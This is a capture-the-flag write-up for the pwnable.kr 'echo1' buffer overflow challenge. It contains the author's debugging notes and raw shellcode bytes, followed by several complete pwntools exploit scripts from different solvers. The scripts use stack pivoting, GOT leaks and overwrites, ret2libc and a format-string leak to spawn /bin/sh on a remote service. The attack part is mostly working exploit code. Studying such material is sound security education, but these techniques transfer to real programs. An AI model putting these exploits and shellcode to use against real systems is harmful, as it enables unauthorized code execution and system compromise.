# echo1
an echo binary with multiple option to echo. Each option is a vulnerability with some restrictions. 
##### global variables (`bss`)
	id
		 an id is store as the first 8 bytes of the username.
	functions
		after looking at the main we can see that if `i` is zero we get to call `func[-1]` that's not a mistake...
	heap object 
		used to print the greetings messages.
		```
		o[0] = name[0]
		o[1] = name[1]
		o[2] = name[2]
		o[3] = greetings
		o[4] = byebye
		```
		looking around using my name I can print the value near it, which is the value of greetings.
### hints
```
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX unknown - GNU_STACK missing
PIE:      No PIE (0x400000)
Stack:    Executable
RWX:      Has RWX segments
```
* `checksec` 
	feels like a buffer overflow :) and maybe execution on the stack... or on the heap? remotely :)
* it would be hard to return to an address below the current stack.
* name's size is 24 bytes. a very standard size for a shellcode :)
### `gdb`

```
b *0x400818 - echo1 (BOF)
b *0x400870 - echo1 leave
b *0x0400871 - echo1 ret
b *0x4007B9 - before fgets
b *0x40094F - after name scanf
b *0x4007C0 - greetings
b *0x400A01 - before i scanf
```

### Though flow
#### echo1 function
we input 128 bytes into buffer of 32 bytes. Then we echo it.

#### problem
we need a shell, I need a way to jump to a location that I know that will contain the shellcode.

#### ideas 
* execution on name 
    let's check if I can jump to name's address on the stack.
    * insert the stack address, then jump to it.
    * use a value inside a register and call it  
        i could `0x400deb : call rdi` and if this value will be `nop` I could sled to shellcode 
        `*RDI  0x7ffd7101f200 —▸ 0x7f85b5cb3050 (funlockfile) ◂— endbr64`  
        shellcode location:  `0x7ffd710214a0 ◂— 0x68732f2f6850c031`
        `0x7ffd71021460 - buff location` the location of `rdi` co
    * use a value on the stack which points to name 
        didn't found anything interesting...
    * use `o` (name's address on the heap)  
    	I could change `rsp` to be `o`'s  location. Then just return.
    	`leave` ret
    	`0x00000000004007be : leave ; ret`
    	don't forget that the new `rbp` should be - 8 bytes because we pop `rbp` before returning
    	**problem**
        	this can't work because the heap is not executable...
	shellcode 
        32bit `\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80` `\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x2C\xF4\xcd\x80`
        64 bit
        `\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05`


	**problem**
        when using the shellcode it contains a byte 0x0b which is one of the white-space characters in c.
        this causes `scanf` to to scan only part of the shellcode. And the other part is detected as not a digit in i's scan. 
        **solution**
        I could change the shellcode and use another byte.
        `sub    al,0xf4` instead of `mov al, 0xb`
	**problem**
	 we send an address of 32 bits long instead of 64 XD.
	**problem**
        ```
        00:0000│ rsp 0x7fffffffdaa8 —▸ 0x400a6c (main+443) ◂— jmp 0x4009a9
        01:0008│     0x7fffffffdab0 ◂— 0x0
        02:0010│     0x7fffffffdab8 ◂— 0x100000000
        03:0018│     0x7fffffffdac0 ◂— 'AAAAAAAAAAAAAAAAAAAAAAA'
        ```
        it's two 8 bytes away :) and it's on the stack!
        `0x0000000000400761 : pop rbx ; pop rbp ; ret` let's get it.
        this direction was not good because we will jump to the contents of the shellcode!
        I can just jump to the global variable
* execution on buff
	**problem** 
	we don't have the stack address.
	
	**ideas**
	* return to buff (using values on the stack)
		where is the buff location on the stack? what's the offset from the ret in echo1 after jumping to a gadget?
		```
		0x7fffffffda78 - location which stores &buf
		0x7fffffffda90 - &buf
		0x7fffffffdab8 - ret location
		```
		the offset is 8 bytes *below*.  `rsp` - 8 bytes = `&buf` 
		**problem**
			`&buf` only on the stack below the current `rsp` which means it would be harder to ret using that address.	  
		**ideas**
	        `leave` (`rsp` will become the override `rbp`)
	        set `esp` using `xchg, mov, add, sub` etc... 
	* leaking using using `puts`  
		**problem** 
		`fgets` writes a null after the last character. and puts stops to print at a null byte.
	* leak stack addresses using `printf`
		It's a normal `printf`. 
		but I could override the `bss`  to cause a format string bug... 
* execution on argv
	a bit far away, but possible

#### A complete new direction
change stdin to the flag file descriptor and it will echo it :).

**problems**
* I cannot write easily to stdin global var
* the flag file is not open, I need to open it and get the `fd`...

### solutions
this is the first time in my life that the exploit didn't worked locally and worked remotely...
for some weird reason on my local machine the heap wasn't executable. but on the remote machine it was...
```python
from pwn import *

context.log_level = 'info'
LEAVE_GADGET = 0x4007be
O_BSS = 0x602098
shellcode = b'\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05'
#                    pop rbp (0x602098)   mov rsp, rbp  pop rbp  ret to the value of O!   
payload = b'A' * 32 + p64(O_BSS - 8) + p64(LEAVE_GADGET) + 'B'*8
# p = process('./echo1')
# p = gdb.debug('./echo1', gdbscript='''
# b *0x0400871
# continue
# ''')
p = remote('pwnable.kr', 9010)
p.recvuntil(b'hey, what\'s your name? : ')
p.sendline(shellcode)
p.recvuntil(b'> ')
p.sendline(b'1')
p.recvline()
p.sendline(payload)
```

helped me change the shellcode: [link](https://security.stackexchange.com/questions/98099/limited-buffer-size-for-shellcode-on-64-bits-machine) 

### `hyprnir`
```python
from pwn import *

context.update(arch="amd64")

s = remote("pwnable.kr", 9010)
s.sendline(asm("jmp rsp") + ('A' * 22))
s.sendline('1')
s.sendline(('A' * 40) + p64(0x00000000006020A0) + asm(shellcraft.sh()))

s.interactive()
```
he put inside id an `jmp rsp` instruction using name. Then jump to execute that instruction which jumped to the shellcode. ID content is inside the `bss`! wow. which on older kernel's is `rwx`. 

### `IdanRosen`
You must first find out the libc version used on the server by leaking runtime addresses of various libc functions (using GOT leak) and using any online libc database website to find out the libc version.
after that, solution using GOT overwrite and ROP (no shellcode):
```python
target.sendlineafter(b"? : ", b"name") # the name is name
target.sendlineafter(b"> ", b"1")

target.recvline()

pop_rbp = 0x400762
gadget = 0x400837 # lea rax, [rbp + 20]

# the idea is to print got.puts value, so we store it inside rbp.
# because the fgets is called we must not harm the got.puts so we give it the dl resolve.
# then puts is called with a pointer to the got.puts, when calling puts the got.puts gets updated to the real location of puts

# this could be simplified by overwriting rbp in the initial leave :)
payload = b'A' * 0x28
payload += p64(pop_rbp) # RA 
payload += p64(elf.got.puts + 0x20) # pop rbp
payload += p64(gadget) # jmp to the second write
target.sendline(payload)

target.recvline()
target.recvuntil(b"name\n") # after the first byebye message

# got.puts = calls puts ld resolve
got_overwrite = p64(elf.plt.puts + 0x6) 
got_overwrite += p64(gadget) 
target.sendline(got_overwrite)
# puts is called with the elf.got.puts (because rbp is got.puts + 0x20)
# then leave ret, rsp = got.puts + 0x20, rbp = *(rbp+20), ret to *(rbp+28)
puts = u64(target.recvline().strip().ljust(8, b'\0'))
log.success("puts: {}".format(hex(puts)))
libc.address = puts - libc.symbols.puts
log.success("libc: {}".format(hex(libc.address)))
log.success("system: {}".format(hex(libc.symbols.system)))

pop_rdi = libc.address + 0x21112
binsh = libc.address + 0x18ce57

payload = p64(pop_rdi) 
payload += p64(binsh)
payload += p64(libc.symbols.system)
payload += p64(libc.symbols.exit)
target.sendline(payload)

target.interactive()
```
The idea here is that you can change `rbp` and call puts with the value of `rbp` as a pointer. puts(`rbp+0x20`)

### `yinon`
~~ placing `pop rdi; ret` instructions in id to set up `glibc` leak, and o on heap leak, then call system(o) ~~
```python
#might take couple tries to work probably because aslr might make some pointer contain a null

from pwn import *

context.terminal = ["tmux", "splitw", "-h"]

RIPOFF = 40
elf = ELF("echo1")

debug = False

if debug:
    f = process("echo1")
else:
    f = remote('pwnable.kr', 9010)

f.sendline("\x5F\xC3/bin/sh") #pop rdi; ret
f.sendline('1')
print(f.recvlines(10, timeout=2))

# getting libc leak - holi fuck, he called puts(got.puts) so easily!
f.sendline(b'a'*(RIPOFF) + p64(elf.symbols['id']) + p64(elf.got['puts']) +
           p64(elf.plt["puts"]) + p64(elf.symbols['echo1']))
print(f.recvline())
print(f.recvline())
leak = bytes(f.recvline()).split(b'\n')[0]

#hardcoded values, shut up i'm lazy
if debug:
    libc_base = int.from_bytes(leak, 'little') - 0x021b10
    systemoff = libc_base + 0x04f550
else:
    libc_base = int.from_bytes(leak, 'little') - 0x06f690
    systemoff = libc_base + 0x045390
print('libc leak: ', hex(libc_base))

# getting o(heap) leak - lol this shit is fun
f.sendline(b'a'*(RIPOFF) + p64(elf.symbols['id'])
           + p64(elf.symbols['o'])+p64(elf.plt["puts"]) + p64(elf.symbols['echo1']))
           
print(f.recvlines(3, timeout=1))
leak = bytes(f.recvline()).split(b'\n')[0]
print(leak)
o = int.from_bytes(leak, 'little')
# jumps to ret to id (pop rdi ret) he said it was because of some padding issues but what? 
# system may expect an align stack so this is the reason... then he just calls system :)
f.sendline(b'a'*RIPOFF+p64(elf.symbols['id']+1) + p64(elf.symbols['id']) + #padding
           p64(o+2) + p64(systemoff) )

print(f.recvlines(3, timeout=1))
f.sendline("whoami")
print(f.recvline())


f.interactive()
```

very nice...
### `ert`
```python
# Running echo1 locally on a newer kernel / libc version
# caused the .bss to be loaded as RW- instead of RWX
# And I'm too dumb to know any libc tricks, so to solve
# I ROPed to leak a stack pointer using a format string vuln
# and then jumped to some shellcode on the (executable) stack
# -ert

from pwn import *

p = remote('pwnable.kr', 9010)
# p = process("./echo1")
# context.terminal = ["alacritty", "-e"]
# p = gdb.debug("./echo1", '''
# b *0x400870
# ''')

e = ELF('./echo1')
context.binary = e

p.recvuntil(b' : ')
p.sendline(b"a")
p.recvuntil(b'> ')
p.sendline(b'1')

# set rbp to bss loc and jump to specific address in echo1 to overwrite
# global object o to second stage payload
pl  = b'X'*32
pl += p64(0x602098 + 0x20) # saved base pointer to o's location + 0x20
pl += p64(0x400837)        # jmps to (lea rax [rbp-0x20]) -> overwrite global obj to second stage payload 
pl += p64(e.sym['main'])   # restart to continue exploitation
p.sendline(pl)

# Set global object o ptr to bss, name to a format string vuln,
# and function pointers to fix stack and call print. After the write we call byebye which jumps to the function start and calls greetings but because it accutally jumps to printf after the end of the call it returns to main :)
# second get_input
pl =  b''
pl += p64(0x6020a0) # *o = o + 8 makes O point to the bss segment
pl += b"stack ptr for u :)%16$p " # o[0] = "stack pt", o[1] = "r for u " o[2] = ":)%16$p "
pl += p64(0x4007db) # greetings = printf (mov rdi, rax) (when calling greetings rax holds o's value which now points to the format string)  
pl += p64(0x400819) # byebye = echo1 (mov rbp, rsp) rbp becomes a stack address 
p.sendline(pl)

# get the stack pointer
p.recvuntil(b":)")
sptr = p.recvuntil(b" ")
print("got sptr:", sptr)

# in restarted main, trigger vuln again and jump to stack buffer with shellcode
p.recvuntil(b' : ')
p.sendline(b"a")
p.recvuntil(b'> ')
p.sendline(b'1')

pl  = b"Y"*40
pl += p64(int(sptr, 16) - 280) # played around a bit to find this offset
pl += b'\x90'*42
pl += asm(shellcraft.execve("/bin/sh"))
p.sendline(pl)

p.interactive()
```
this one is magnificent.
### `strawhat`
```python
from pwn import *

context.binary = ELF("./echo1",checksec=False)

o = 0x602098
sc = asm(pwnlib.shellcraft.sh())

p = remote("pwnable.kr",9010)

print(sc)


p.sendline(b"a" * 0x18) # name
p.sendline(b"1")
# writes to o+16
payload2 = cyclic(0x20) # random character sequnce 
payload2 += p64(o+0x30) # rbp value
payload2 += p64(0x400837) # jmps to lea rax, [rbp -0x20] and input again
p.sendline(payload2)
# writes the location of the shellcode into byebye :)
p.sendline(p64(0x6020d8) * 6 + sc) 

p.interactive()
```

